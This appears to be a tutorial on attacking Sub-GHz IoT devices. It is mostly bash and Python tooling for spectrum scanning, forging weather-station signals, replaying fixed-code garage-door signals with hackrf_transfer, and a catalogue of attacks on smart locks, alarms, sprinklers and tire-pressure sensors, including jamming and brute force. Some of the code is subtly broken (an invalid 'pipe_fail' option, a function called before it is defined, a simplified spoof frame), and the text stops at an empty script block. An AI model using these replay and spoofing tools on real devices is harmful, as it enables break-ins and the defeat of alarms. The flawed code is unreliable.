# Sub-GHz IoT Device Attack Guide

## Introduction

The Sub-GHz radio frequency bands (typically 315 MHz, 433 MHz, 868 MHz, and 915 MHz) are the backbone of countless Internet of Things (IoT) devices, spanning weather stations, garage door openers, smart home sensors, wireless doorbells, tire pressure monitoring systems, remote power outlets, and building automation devices. These devices predominantly use simple modulation schemes such as On-Off Keying (OOK) and Frequency Shift Keying (FSK) with minimal or no encryption, making them accessible targets for Software Defined Radio security assessment.

The ISM (Industrial, Scientific, Medical) bands at 433.05-434.79 MHz and 868-868.6 MHz (Europe) or 902-928 MHz (North America) are license-free bands where device manufacturers prioritize cost and simplicity over security. Most Sub-GHz IoT devices transmit in the clear using fixed codes or proprietary protocols with weak obfuscation rather than cryptographic protection. This creates a broad attack surface that security professionals must assess to protect residential, commercial, and industrial environments.

This guide covers Sub-GHz IoT protocol analysis, practical attack techniques against common device categories (weather stations, garage doors, smart home devices), signal capture and replay methodology using HackRF One and RTL-SDR, protocol reverse engineering with Universal Radio Hacker (URH), and defensive countermeasures. All techniques require explicit authorization and must be performed in controlled lab environments or on owned equipment.

**Objectives**: Master Sub-GHz signal analysis for IoT device assessment, implement replay attacks against fixed-code devices, reverse engineer proprietary IoT protocols, execute rolling code analysis, and evaluate Sub-GHz IoT security countermeasures.

## Part 1: Sub-GHz Spectrum Survey and Device Discovery

### Systematic Sub-GHz Scanning

Before targeting specific devices, conduct a comprehensive spectrum survey to identify all active Sub-GHz transmissions in the target environment. This reconnaissance phase maps the RF landscape and identifies devices, their frequencies, modulation types, and transmission patterns.

```bash
#!/bin/bash
# Sub-GHz IoT Spectrum Survey Script
# Scans common IoT frequency bands for active transmissions

set -euo pipe_fail

OUTPUT_DIR="/opt/subghz_survey/$(date +%Y%m%d_%H%M%S)"
mkdir -p "${OUTPUT_DIR}"

echo "[*] Sub-GHz IoT Spectrum Survey"
echo "[*] Output: ${OUTPUT_DIR}"

# Step 1: Wideband scan of 433 MHz ISM band
echo "[1/5] Scanning 433 MHz ISM band (433.0 - 434.8 MHz)..."
rtl_power -f 433000000:434800000:1000 -i 1 -e 60 \
  -c 50% "${OUTPUT_DIR}/433mhz_1min.csv"

# Generate heatmap visualization
python3 -c "
import numpy as np
data = np.loadtxt('${OUTPUT_DIR}/433mhz_1min.csv', delimiter=',', skiprows=1)
if data.ndim == 1:
    data = data.reshape(1, -1)
# Columns: date, time, freq_low, freq_high, freq_step, samples, dbm_min, dbm_max, dbm_avg
freqs = data[:, 2]  # freq_low
power = data[:, 8]  # dbm_avg
print(f'Scanned {len(np.unique(freqs))} frequency bins')
print(f'Power range: {power.min():.1f} to {power.max():.1f} dB')
print(f'Strong signals (> -30 dB):')
for i in np.where(power > -30)[0]:
    freq_mhz = freqs[i] / 1e6
    print(f'  {freq_mhz:.3f} MHz: {power[i]:.1f} dB')
"

# Step 2: Scan 868 MHz band (European ISM)
echo "[2/5] Scanning 868 MHz ISM band..."
rtl_power -f 868000000:868600000:1000 -i 1 -e 60 \
  -c 50% "${OUTPUT_DIR}/868mhz_1min.csv"

# Step 3: Scan 315 MHz band (North American automotive/keyfob)
echo "[3/5] Scanning 315 MHz band..."
rtl_power -f 314000000:316000000:1000 -i 1 -e 60 \
  -c 50% "${OUTPUT_DIR}/315mhz_1min.csv"

# Step 4: Scan 390 MHz band (garage doors)
echo "[4/5] Scanning 390 MHz band..."
rtl_power -f 389000000:391000000:1000 -i 1 -e 60 \
  -c 50% "${OUTPUT_DIR}/390mhz_1min.csv"

# Step 5: Consolidated analysis
echo "[5/5] Generating consolidated survey report..."
python3 -c "
import numpy as np
import json

survey = {
    'bands_scanned': ['433 MHz ISM', '868 MHz ISM', '315 MHz Auto', '390 MHz Garage'],
    'active_frequencies': []
}

band_files = {
    '433_mhz': '${OUTPUT_DIR}/433mhz_1min.csv',
    '868_mhz': '${OUTPUT_DIR}/868mhz_1min.csv',
    '315_mhz': '${OUTPUT_DIR}/315mhz_1min.csv',
    '390_mhz': '${OUTPUT_DIR}/390mhz_1min.csv'
}

for band, filepath in band_files.items():
    try:
        data = np.loadtxt(filepath, delimiter=',')
        if data.ndim == 1:
            data = data.reshape(1, -1)
        freqs = data[:, 2]
        power = data[:, 8]
        threshold = np.mean(power) + 3 * np.std(power)

        strong_indices = np.where(power > threshold)[0]
        for idx in strong_indices:
            freq_mhz = freqs[idx] / 1e6
            survey['active_frequencies'].append({
                'band': band,
                'frequency_mhz': round(freq_mhz, 3),
                'power_db': round(power[idx], 1),
                'likely_device': classify_frequency(freq_mhz)
            })
    except Exception as e:
        print(f'Error processing {band}: {e}')

def classify_frequency(freq_mhz):
    # Rough classification based on common IoT device frequencies
    if 433.8 <= freq_mhz <= 434.0:
        return 'Weather station / IoT sensor (433.92 MHz typical)'
    elif 315.0 <= freq_mhz <= 315.1:
        return 'Automotive keyfob / TPMS'
    elif 390.0 <= freq_mhz <= 390.2:
        return 'Garage door opener'
    elif 868.0 <= freq_mhz <= 868.6:
        return 'European IoT / LoRa / Home automation'
    else:
        return 'Unknown device'

with open('${OUTPUT_DIR}/survey_report.json', 'w') as f:
    json.dump(survey, f, indent=2)

print(f'Active frequencies found: {len(survey[\"active_frequencies\"])}')
"

echo "[+] Survey complete. Results in: ${OUTPUT_DIR}"
```

### Signal Classification with GNURadio

```python
#!/usr/bin/env python3
"""Sub-GHz Signal Classifier - Automatically identifies modulation
type and protocol characteristics of captured Sub-GHz IoT signals."""

import numpy as np
from scipy import signal as sci_signal
from scipy.fft import fft, fftfreq


class SubGHzSignalClassifier:
    """Classify Sub-GHz IoT signals by modulation and protocol characteristics."""

    def __init__(self, iq_file, sample_rate=8000000, center_freq=433920000):
        raw = np.fromfile(iq_file, dtype=np.int8)
        i_data = raw[0::2].astype(np.float32) / 128.0
        q_data = raw[1::2].astype(np.float32) / 128.0
        self.iq = i_data + 1j * q_data
        self.sample_rate = sample_rate
        self.center_freq = center_freq

    def detect_modulation(self):
        """Detect modulation type (OOK, FSK, ASK, PSK) from signal characteristics."""
        amplitude = np.abs(self.iq)
        phase = np.angle(self.iq)
        instantaneous_freq = np.diff(np.unwrap(phase)) * self.sample_rate / (2 * np.pi)

        # Normalize
        amp_norm = amplitude / np.max(amplitude)
        freq_norm = instantaneous_freq / np.max(np.abs(instantaneous_freq))

        # OOK detection: amplitude has clear bimodal distribution (0 or 1)
        amp_hist, _ = np.histogram(amp_norm, bins=20)
        amp_bimodal = len([h for h in amp_hist if h > len(amp_norm) * 0.01]) < 8

        # FSK detection: frequency has bimodal distribution
        freq_hist, _ = np.histogram(freq_norm, bins=20)
        freq_bimodal = len([h for h in freq_hist if h > len(freq_norm) * 0.01]) < 8

        # Calculate amplitude variance (ASK has high variance, FSK low)
        amp_variance = np.var(amp_norm)

        # Calculate frequency variance (FSK has high variance, ASK low)
        freq_variance = np.var(freq_norm)

        classification = "Unknown"

        if amp_bimodal and amp_variance > 0.1:
            if freq_variance < 0.05:
                classification = "OOK (On-Off Keying)"
            else:
                classification = "ASK (Amplitude Shift Keying)"
        elif freq_bimodal and freq_variance > 0.05:
            if amp_variance < 0.05:
                classification = "FSK (Frequency Shift Keying)"
            else:
                classification = "GFSK (Gaussian FSK)"
        elif amp_variance < 0.05 and freq_variance < 0.05:
            classification = "PSK (Phase Shift Keying) or CW"

        results = {
            "modulation": classification,
            "amplitude_variance": round(float(amp_variance), 4),
            "frequency_variance": round(float(freq_variance), 4),
            "amplitude_bimodal": amp_bimodal,
            "frequency_bimodal": freq_bimodal
        }

        print(f"[*] Modulation Detection Results:")
        print(f"    Classification: {classification}")
        print(f"    Amplitude variance: {amp_variance:.4f}")
        print(f"    Frequency variance: {freq_variance:.4f}")

        return results

    def estimate_parameters(self):
        """Estimate signal parameters: baud rate, deviation, bandwidth."""
        amplitude = np.abs(self.iq)

        # Estimate signal bandwidth
        spectrum = np.abs(fft(self.iq[:min(len(self.iq), 2**20)]))
        freqs = fftfreq(len(spectrum), 1.0 / self.sample_rate)
        power_spectrum = 20 * np.log10(spectrum + 1e-10)

        # Find -3dB bandwidth
        peak_power = np.max(power_spectrum)
        threshold = peak_power - 3
        above_threshold = np.where(power_spectrum > threshold)[0]
        if len(above_threshold) > 0:
            bandwidth = (above_threshold[-1] - above_threshold[0]) * \
                        (self.sample_rate / len(power_spectrum))
        else:
            bandwidth = 0

        # Estimate baud rate by finding shortest pulse duration
        amp_binary = (amplitude > np.mean(amplitude)).astype(int)
        transitions = np.diff(amp_binary)
        rising_edges = np.where(transitions == 1)[0]
        falling_edges = np.where(transitions == -1)[0]

        if len(rising_edges) > 2:
            pulse_durations = np.diff(rising_edges)
            min_pulse = np.min(pulse_durations)
            baud_rate = self.sample_rate / min_pulse
        else:
            baud_rate = 0

        params = {
            "bandwidth_hz": round(float(bandwidth), 0),
            "estimated_baud_rate": round(float(baud_rate), 0),
            "center_frequency_hz": self.center_freq,
            "sample_rate": self.sample_rate,
            "signal_duration_ms": round(len(self.iq) / self.sample_rate * 1000, 1)
        }

        print(f"\n[*] Signal Parameters:")
        print(f"    Bandwidth: {bandwidth:.0f} Hz ({bandwidth/1000:.1f} kHz)")
        print(f"    Est. baud rate: {baud_rate:.0f} bps")
        print(f"    Duration: {len(self.iq)/self.sample_rate*1000:.1f} ms")

        return params

    def find_signal_bursts(self, threshold_db=-30):
        """Find individual signal bursts in the capture."""
        amplitude = np.abs(self.iq)
        power_db = 20 * np.log10(amplitude + 1e-10)
        threshold = np.mean(power_db) + (threshold_db - np.mean(power_db)) * 0.5

        above = power_db > threshold
        transitions = np.diff(above.astype(int))
        starts = np.where(transitions == 1)[0]
        ends = np.where(transitions == -1)[0]

        bursts = []
        for i in range(min(len(starts), len(ends))):
            start_sample = starts[i]
            end_sample = ends[i]
            duration_ms = (end_sample - start_sample) / self.sample_rate * 1000
            peak_power = np.max(power_db[start_sample:end_sample])
            bursts.append({
                "start_sample": int(start_sample),
                "end_sample": int(end_sample),
                "duration_ms": round(float(duration_ms), 2),
                "peak_power_db": round(float(peak_power), 1)
            })

        print(f"\n[*] Signal Bursts Detected: {len(bursts)}")
        for i, burst in enumerate(bursts[:10]):
            print(f"    Burst {i+1}: {burst['duration_ms']:.1f} ms, "
                  f"peak {burst['peak_power_db']:.1f} dB")

        return bursts


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 subghz_classifier.py <iq_capture.raw> [sample_rate] [center_freq]")
        print("  Example: python3 subghz_classifier.py weather.raw 8000000 433920000")
        sys.exit(1)

    classifier = SubGHzSignalClassifier(
        sys.argv[1],
        int(sys.argv[2]) if len(sys.argv) > 2 else 8000000,
        int(sys.argv[3]) if len(sys.argv) > 3 else 433920000
    )

    classifier.detect_modulation()
    classifier.estimate_parameters()
    classifier.find_signal_bursts()
```

## Part 2: Weather Station and IoT Sensor Attacks

### Weather Station Protocol Analysis

Consumer weather stations typically transmit temperature, humidity, and wind data on 433.92 MHz using OOK modulation with manufacturer-specific protocols. These transmissions contain no encryption and can be captured, decoded, and spoofed.

```python
#!/usr/bin/env python3
"""Weather Station Signal Decoder and Spoofer.

Decodes common weather station protocols (Oregon Scientific, Lacrosse,
AcuRite, Fine Offset) from captured 433 MHz OOK signals and provides
spoofing capability for authorized testing.
"""

import numpy as np
from collections import defaultdict


class WeatherStationDecoder:
    """Decode weather station protocols from captured Sub-GHz signals."""

    # Common weather station protocol parameters
    PROTOCOLS = {
        "oregon_scientific": {
            "modulation": "OOK",
            "frequency": 433920000,
            "encoding": "Manchester",
            "preamble": [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
            "sensor_types": {
                0x1A2D: "THGR122N (Temperature/Humidity)",
                0x1A3D: "THGR228N (Temperature/Humidity)",
                0x2A1D: "WGR918 (Wind)",
                0x3A0D: "RGR126 (Rain)",
                0x5A6D: "BTHR918N (Baro/Temp/Humidity)"
            }
        },
        "acurite": {
            "modulation": "OOK",
            "frequency": 433920000,
            "encoding": "NRZ",
            "preamble": [1, 0, 1, 0, 1, 0, 1, 0],
            "sensor_types": {
                0x38: "Temperature Sensor",
                0x2F: "Tower (Temp/Humidity)",
                0x3F: "5-in-1 Weather Station"
            }
        },
        "fine_offset": {
            "modulation": "OOK",
            "frequency": 433920000,
            "encoding": "Manchester",
            "preamble": [1, 0, 1, 0, 1, 0, 1, 0],
            "sensor_types": {
                0x00: "WH1080 (Weather Station)",
                0x05: "WH5 (Temperature)"
            }
        }
    }

    def __init__(self, iq_file, sample_rate=8000000):
        raw = np.fromfile(iq_file, dtype=np.int8)
        i_data = raw[0::2].astype(np.float32) / 128.0
        q_data = raw[1::2].astype(np.float32) / 128.0
        self.iq = i_data + 1j * q_data
        self.sample_rate = sample_rate

    def extract_ook_bits(self, threshold_percentile=70):
        """Extract OOK-modulated bitstream from I/Q data."""
        amplitude = np.abs(self.iq)
        threshold = np.percentile(amplitude, threshold_percentile)
        binary = (amplitude > threshold).astype(np.int8)

        # Find the bit period by analyzing pulse widths
        transitions = np.diff(binary)
        pulse_starts = np.where(transitions == 1)[0]
        pulse_ends = np.where(transitions == -1)[0]

        if len(pulse_starts) < 2:
            print("[!] Insufficient pulses detected")
            return []

        pulse_widths = np.diff(pulse_starts)
        if len(pulse_widths) == 0:
            return []

        # Shortest pulse width = 1 bit period
        bit_period = int(np.percentile(pulse_widths, 10))

        # Resample at bit period intervals
        bits = []
        for i in range(0, len(binary), bit_period):
            segment = binary[i:i + bit_period]
            if len(segment) > 0:
                bits.append(int(np.round(np.mean(segment))))

        print(f"[*] Extracted {len(bits)} raw bits (bit period: {bit_period} samples)")
        return bits

    def decode_temperature(self, raw_temp, protocol="oregon"):
        """Decode temperature value from raw sensor data.

        Oregon Scientific uses BCD encoding for temperature with
        a sign bit and 0.1 degree resolution.
        """
        if protocol == "oregon":
            # Temperature is 12 bits: sign + 3 BCD nibbles
            sign = -1 if (raw_temp & 0x800) else 1
            tens = (raw_temp >> 8) & 0x0F
            units = (raw_temp >> 4) & 0x0F
            tenths = raw_temp & 0x0F
            temperature = sign * (tens * 10 + units + tenths * 0.1)
            return round(temperature, 1)
        elif protocol == "acurite":
            # AcuRite: 12-bit value, 0.1 degree resolution
            temperature = (raw_temp - 1000) / 10.0
            return round(temperature, 1)
        return raw_temp

    def decode_humidity(self, raw_humidity, protocol="oregon"):
        """Decode humidity value from raw sensor data."""
        if protocol == "oregon":
            # BCD encoded: two nibbles
            tens = (raw_humidity >> 4) & 0x0F
            units = raw_humidity & 0x0F
            return tens * 10 + units
        return raw_humidity

    def generate_spoofed_signal(self, temperature, humidity, sensor_id, protocol="oregon"):
        """Generate spoofed weather station signal for authorized testing.

        Creates an OOK-modulated signal that mimics the target protocol.
        """
        print(f"\n[*] Generating spoofed {protocol} signal:")
        print(f"    Temperature: {temperature} C")
        print(f"    Humidity: {humidity} %")
        print(f"    Sensor ID: 0x{sensor_id:04x}")

        if protocol == "oregon":
            # Build Oregon Scientific frame
            # Preamble + Sync + Sensor ID + Channel + Rolling Code + Data + Checksum
            frame_bits = []

            # Preamble (16 alternating bits)
            frame_bits.extend([1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0])

            # Sensor ID (16 bits, reversed nibbles)
            frame_bits.extend(self._int_to_bits(sensor_id, 16))

            # Channel (8 bits)
            frame_bits.extend([0, 0, 0, 0, 0, 0, 0, 1])

            # Temperature (12 bits BCD)
            abs_temp = abs(temperature)
            sign_bit = 1 if temperature < 0 else 0
            temp_bcd = (
                (int(abs_temp / 10) & 0x0F) << 8 |
                (int(abs_temp) % 10 & 0x0F) << 4 |
                (int(abs_temp * 10) % 10 & 0x0F)
            )
            if sign_bit:
                temp_bcd |= 0x800
            frame_bits.extend(self._int_to_bits(temp_bcd, 12))

            # Humidity (8 bits BCD)
            hum_bcd = ((humidity // 10) & 0x0F) << 4 | (humidity % 10 & 0x0F)
            frame_bits.extend(self._int_to_bits(hum_bcd, 8))

            print(f"    Frame length: {len(frame_bits)} bits")

            # Convert bits to OOK signal
            samples_per_bit = 400  # At 2 MSPS, ~400 samples per bit
            signal_data = np.array([], dtype=np.complex64)

            for bit in frame_bits:
                if bit:
                    # High signal
                    samples = np.ones(samples_per_bit, dtype=np.complex64) * 0.8
                else:
                    # Low signal (silence)
                    samples = np.zeros(samples_per_bit, dtype=np.complex64)
                signal_data = np.concatenate([signal_data, samples])

            return signal_data

        return np.array([], dtype=np.complex64)

    def _int_to_bits(self, value, num_bits):
        """Convert integer to list of bits."""
        bits = []
        for i in range(num_bits - 1, -1, -1):
            bits.append((value >> i) & 1)
        return bits


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 weather_decoder.py <capture.raw> [sample_rate]")
        print("  Decode: python3 weather_decoder.py weather_capture.raw 8000000")
        print("  Capture: hackrf_transfer -r weather.raw -f 433920000 -s 8000000 -l 32 -g 20")
        sys.exit(1)

    decoder = WeatherStationDecoder(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 8000000)
    bits = decoder.extract_ook_bits()
    if bits:
        print(f"[*] First 64 bits: {''.join(str(b) for b in bits[:64])}")

        # Try to decode as temperature/humidity
        # This is simplified - actual decoding requires protocol-specific parsing
        print("[*] Attempting temperature decode from bitstream...")
```

## Part 3: Garage Door Replay Attacks

### Garage Door Protocol Analysis

Garage door openers operate on 315 MHz (North America), 390 MHz, or 433 MHz using simple OOK modulation. Modern systems use rolling codes (KeeLoq or similar), while older systems use fixed codes that are trivially replayable.

```python
#!/usr/bin/env python3
"""Garage Door Opener Analysis Tool.

Analyzes garage door opener signals to identify fixed-code vs
rolling-code implementations and assess replay attack feasibility.
"""

import numpy as np
import hashlib
from datetime import datetime


class GarageDoorAnalyzer:
    """Analyze garage door opener signals for security assessment."""

    FIXED_CODE_INDICATORS = {
        "same_code_on_repeat": "Signal is identical across multiple presses",
        "short_payload": "Payload is < 24 bits (typical fixed code length)",
        "no_counter": "No incrementing field visible in decoded data",
        "manufacturer": "Older Chamberlain, Genie, LiftMaster models (pre-2010)"
    }

    ROLLING_CODE_INDICATORS = {
        "changing_code": "Signal changes on every button press",
        "counter_field": "Incrementing counter field in decoded data",
        "longer_payload": "Payload > 32 bits with variable portion",
        "encryption": "KeeLoq, Rolling Code, or AES-based"
    }

    def __init__(self):
        self.captures = []
        self.analysis_results = []

    def add_capture(self, iq_file, label="", sample_rate=2000000):
        """Add a signal capture for analysis."""
        raw = np.fromfile(iq_file, dtype=np.int8)
        i_data = raw[0::2].astype(np.float32) / 128.0
        q_data = raw[1::2].astype(np.float32) / 128.0
        iq = i_data + 1j * q_data
        amplitude = np.abs(iq)

        capture = {
            "label": label,
            "file": iq_file,
            "sample_rate": sample_rate,
            "samples": len(iq),
            "duration_ms": round(len(iq) / sample_rate * 1000, 1),
            "peak_amplitude": float(np.max(amplitude)),
            "mean_amplitude": float(np.mean(amplitude)),
            "timestamp": datetime.now().isoformat()
        }

        self.captures.append(capture)
        print(f"[*] Capture added: {label}")
        print(f"    Samples: {len(iq)}, Duration: {capture['duration_ms']:.1f} ms")
        return capture

    def compare_captures(self):
        """Compare multiple captures to determine fixed vs rolling code.

        If the decoded data is identical across captures, the system
        uses fixed codes and is vulnerable to replay. If the data
        changes, it uses rolling codes.
        """
        print("\n[*] Comparing captures for fixed/rolling code detection...")

        if len(self.captures) < 2:
            print("[!] Need at least 2 captures for comparison")
            return

        # Extract bit patterns from each capture
        bit_patterns = []
        for capture in self.captures:
            bits = self._extract_bits(capture)
            bit_patterns.append(bits)
            print(f"    {capture['label']}: {len(bits)} bits - "
                  f"{''.join(str(b) for b in bits[:32])}...")

        # Compare patterns
        if len(bit_patterns) >= 2:
            pattern_1 = ''.join(str(b) for b in bit_patterns[0])
            pattern_2 = ''.join(str(b) for b in bit_patterns[1])

            if pattern_1 == pattern_2:
                result = {
                    "code_type": "FIXED CODE",
                    "vulnerability": "REPLAYABLE",
                    "severity": "CRITICAL",
                    "detail": "Identical signal across multiple captures - system uses fixed code"
                }
                print(f"\n[!!!] FIXED CODE DETECTED - VULNERABLE TO REPLAY")
                print(f"      Pattern 1: {pattern_1[:48]}")
                print(f"      Pattern 2: {pattern_2[:48]}")
            else:
                # Find the changing portion
                common_prefix = 0
                for i in range(min(len(pattern_1), len(pattern_2))):
                    if pattern_1[i] == pattern_2[i]:
                        common_prefix += 1
                    else:
                        break

                result = {
                    "code_type": "ROLLING CODE",
                    "vulnerability": "REPLAY RESISTANT",
                    "severity": "LOW",
                    "detail": f"Signal changes between captures. Common prefix: {common_prefix} bits"
                }
                print(f"\n[+] ROLLING CODE DETECTED - Replay resistant")
                print(f"    Common prefix: {common_prefix} bits")
                print(f"    Pattern 1: {pattern_1[:48]}")
                print(f"    Pattern 2: {pattern_2[:48]}")
                print(f"    Diff from bit {common_prefix}")

                # Analyze rolling code characteristics
                if common_prefix < 12:
                    print("    [!] Short fixed prefix - may be vulnerable to prediction attacks")
                    result["severity"] = "MEDIUM"

            self.analysis_results.append(result)

    def assess_rolling_code_implementation(self, captures_bit_patterns):
        """Assess the quality of rolling code implementation.

        Common weaknesses:
        - Small counter space (16-bit or less)
        - Predictable increment (always +1)
        - No mutual authentication
        - Weak encryption (KeeLoq with known keys)
        """
        print("\n[*] Rolling Code Implementation Assessment")

        if len(captures_bit_patterns) < 3:
            print("[!] Need 3+ captures for rolling code analysis")
            return

        # Convert bit patterns to integers
        values = []
        for bits in captures_bit_patterns:
            value = int(''.join(str(b) for b in bits), 2)
            values.append(value)

        # Check for sequential incrementing
        diffs = [values[i+1] - values[i] for i in range(len(values)-1)]

        if all(d == 1 for d in diffs):
            print("    [!] Sequential counter increment detected (+1)")
            print("    [!] Vulnerable to prediction after observing one code")
        elif len(set(diffs)) == 1:
            print(f"    [!] Constant increment of {diffs[0]}")
            print("    [!] Predictable rolling pattern")
        else:
            print(f"    [+] Non-sequential increments: {diffs}")
            print("    [+] May use cryptographic rolling code")

        # Estimate counter space
        value_range = max(values) - min(values)
        if value_range < 65536:
            print(f"    [!] Small counter space: {value_range} (16-bit or less)")
            print("    [!] Counter could be brute-forced in seconds")
        elif value_range < 2**32:
            print(f"    [*] Medium counter space: ~{value_range} bits")

    def generate_replay_signal(self, source_capture, output_file):
        """Generate replay signal from a captured fixed-code transmission.

        Only effective against fixed-code systems identified by compare_captures().
        """
        print(f"\n[*] Generating replay signal from {source_capture}...")

        # For fixed-code systems, the original capture IS the replay signal
        # Just re-transmit the captured I/Q data
        capture = next((c for c in self.captures if c["label"] == source_capture), None)

        if capture:
            print(f"    Source: {capture['file']}")
            print(f"    Re-transmit command:")
            print(f"    hackrf_transfer -t {capture['file']} -f 390000000 "
                  f"-s {capture['sample_rate']} -x 30")
            print(f"    [!] Only transmit on frequencies and devices you own and are authorized to test")
        else:
            print(f"    [!] Capture not found: {source_capture}")

    def _extract_bits(self, capture):
        """Extract bit pattern from a capture."""
        raw = np.fromfile(capture["file"], dtype=np.int8)
        i_data = raw[0::2].astype(np.float32) / 128.0
        q_data = raw[1::2].astype(np.float32) / 128.0
        amplitude = np.abs(i_data + 1j * q_data)

        threshold = np.mean(amplitude) + np.std(amplitude)
        binary = (amplitude > threshold).astype(np.int8)

        # Find signal burst (active portion)
        above = np.where(binary == 1)[0]
        if len(above) == 0:
            return []

        start = above[0]
        end = above[-1]
        burst = binary[start:end+1]

        # Decode using pulse width analysis
        bits = []
        i = 0
        while i < len(burst):
            if burst[i] == 1:
                # Count consecutive 1s (pulse width)
                pulse_len = 0
                while i < len(burst) and burst[i] == 1:
                    pulse_len += 1
                    i += 1
                # Long pulse = 1, short pulse = 0 (simplified)
                if pulse_len > len(burst) * 0.001:
                    bits.append(1)
                else:
                    bits.append(0)
            else:
                i += 1

        return bits[:64]  # Return first 64 bits


if __name__ == "__main__":
    import sys

    print("Garage Door Opener Analysis Tool")
    print("=" * 50)
    print()
    print("Usage:")
    print("  1. Capture multiple button presses:")
    print("     hackrf_transfer -r press1.raw -f 390000000 -s 2000000 -l 32 -g 20 -n 10000000")
    print("     hackrf_transfer -r press2.raw -f 390000000 -s 2000000 -l 32 -g 20 -n 10000000")
    print()
    print("  2. Run analysis:")
    print("     python3 garage_door_analyzer.py press1.raw press2.raw [press3.raw ...]")

    if len(sys.argv) < 3:
        sys.exit(1)

    analyzer = GarageDoorAnalyzer()

    for i, filepath in enumerate(sys.argv[1:], 1):
        analyzer.add_capture(filepath, label=f"press_{i}")

    analyzer.compare_captures()
```

## Part 4: Smart Home Device Manipulation

### Smart Home RF Protocol Assessment

Many smart home devices use Sub-GHz RF for communication, including smart plugs, light switches, door sensors, motion detectors, and sprinkler systems. These devices often use proprietary protocols or simplified versions of standards like Zigbee at Sub-GHz frequencies.

```python
#!/usr/bin/env python3
"""Smart Home Sub-GHz Device Assessment Framework.

Assesses Sub-GHz smart home devices for replay attacks,
command injection, and unauthorized control.
"""

import numpy as np
import json
from datetime import datetime


class SmartHomeRFAssessor:
    """Assess Sub-GHz smart home device security."""

    DEVICE_CATALOG = {
        "remote_outlet": {
            "frequencies": [433920000, 315000000],
            "modulation": "OOK",
            "protocol": "Fixed code (typically 24-bit)",
            "attack_surface": [
                "Replay ON/OFF commands from captured signals",
                "Brute force short code spaces (24 bits = 16M combinations)",
                "Jam-and-replay for rolling code variants"
            ],
            "severity": "HIGH"
        },
        "wireless_doorbell": {
            "frequencies": [433920000],
            "modulation": "OOK",
            "protocol": "Fixed code (short, often 8-12 bits)",
            "attack_surface": [
                "Ring doorbell remotely by replaying captured signal",
                "Brute force trivial code space",
                "Continuous replay for denial of service"
            ],
            "severity": "MEDIUM"
        },
        "motion_sensor": {
            "frequencies": [433920000, 868000000],
            "modulation": "OOK/FSK",
            "protocol": "Manufacturer-specific (usually fixed code)",
            "attack_surface": [
                "Trigger false motion alerts",
                "Suppress genuine alerts by jamming",
                "Replay to trigger automated responses (lights, alarms)"
            ],
            "severity": "MEDIUM"
        },
        "smart_door_lock_rf": {
            "frequencies": [433920000, 868000000],
            "modulation": "OOK/FSK/GFSK",
            "protocol": "Varies: fixed code, rolling code, or AES-encrypted",
            "attack_surface": [
                "Replay if fixed code (trivial)",
                "Rolling code prediction if weak implementation",
                "Deauthentication or jamming for DoS",
                "Downgrade attack to force fallback to unencrypted mode"
            ],
            "severity": "CRITICAL"
        },
        "tire_pressure_monitor": {
            "frequencies": [315000000, 433920000],
            "modulation": "FSK/OOK",
            "protocol": "Manufacturer-specific with short sensor ID",
            "attack_surface": [
                "Spoof tire pressure readings to trigger warnings",
                "Inject false sensor data to vehicle ECU",
                "Track vehicle by monitoring unique sensor IDs"
            ],
            "severity": "HIGH"
        },
        "sprinkler_system": {
            "frequencies": [433920000],
            "modulation": "OOK",
            "protocol": "Fixed code with zone addressing",
            "attack_surface": [
                "Activate/deactivate sprinkler zones remotely",
                "Flood-specific zone targeting through replay",
                "Suppress irrigation schedules by jamming"
            ],
            "severity": "MEDIUM"
        }
    }

    def assess_device(self, device_type):
        """Provide security assessment for a specific device category."""
        device = self.DEVICE_CATALOG.get(device_type)
        if not device:
            print(f"[!] Unknown device type: {device_type}")
            print(f"    Available: {', '.join(self.DEVICE_CATALOG.keys())}")
            return

        print(f"\n{'='*60}")
        print(f"Device Assessment: {device_type.replace('_', ' ').title()}")
        print(f"{'='*60}")
        print(f"  Frequencies:    {', '.join(f'{f/1e6:.1f} MHz' for f in device['frequencies'])}")
        print(f"  Modulation:     {device['modulation']}")
        print(f"  Protocol:       {device['protocol']}")
        print(f"  Severity:       {device['severity']}")
        print(f"\n  Attack Surface:")
        for attack in device["attack_surface"]:
            print(f"    - {attack}")

    def generate_capture_plan(self, device_type):
        """Generate a signal capture plan for the specified device."""
        device = self.DEVICE_CATALOG.get(device_type)
        if not device:
            return

        print(f"\n[*] Signal Capture Plan for {device_type}")
        print(f"{'='*60}")

        for freq in device["frequencies"]:
            freq_mhz = freq / 1e6
            print(f"\n  Frequency: {freq_mhz:.2f} MHz")
            print(f"  Capture command:")
            print(f"    hackrf_transfer -r {device_type}_{freq_mhz:.0f}mhz.raw \\")
            print(f"      -f {freq} -s 8000000 -l 32 -g 20 -n 80000000")
            print(f"\n  Analysis command:")
            print(f"    inspectrum {device_type}_{freq_mhz:.0f}mhz.raw -r 8000000")
            print(f"\n  Decode command:")
            print(f"    urh {device_type}_{freq_mhz:.0f}mhz.raw")

        print(f"\n  Recommended captures:")
        print(f"    1. Normal operation (press button / trigger sensor)")
        print(f"    2. Repeat operation (same button / same trigger)")
        print(f"    3. Different state (ON vs OFF, if applicable)")
        print(f"    4. Different zone/channel (if applicable)")

    def assess_all_devices(self):
        """Assess all devices in the catalog."""
        print("\n" + "=" * 60)
        print("Smart Home Sub-GHz Device Security Summary")
        print("=" * 60)

        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_devices = sorted(
            self.DEVICE_CATALOG.items(),
            key=lambda x: severity_order.get(x[1]["severity"], 4)
        )

        print(f"\n{'Device':<25} {'Severity':<10} {'Frequency':<15} {'Protocol'}")
        print("-" * 70)
        for name, device in sorted_devices:
            freqs = ', '.join(f"{f/1e6:.0f}" for f in device["frequencies"])
            print(f"{name:<25} {device['severity']:<10} {freqs + ' MHz':<15} {device['protocol']}")


if __name__ == "__main__":
    import sys

    assessor = SmartHomeRFAssessor()

    if len(sys.argv) > 1:
        for device in sys.argv[1:]:
            assessor.assess_device(device)
            assessor.generate_capture_plan(device)
    else:
        assessor.assess_all_devices()
        print(f"\nUsage: python3 smart_home_assessor.py <device_type> [device_type ...]")
        print(f"       python3 smart_home_assessor.py remote_outlet wireless_doorbell")
```

### Automated Sub-GHz Replay with HackRF

```bash
#!/bin/bash
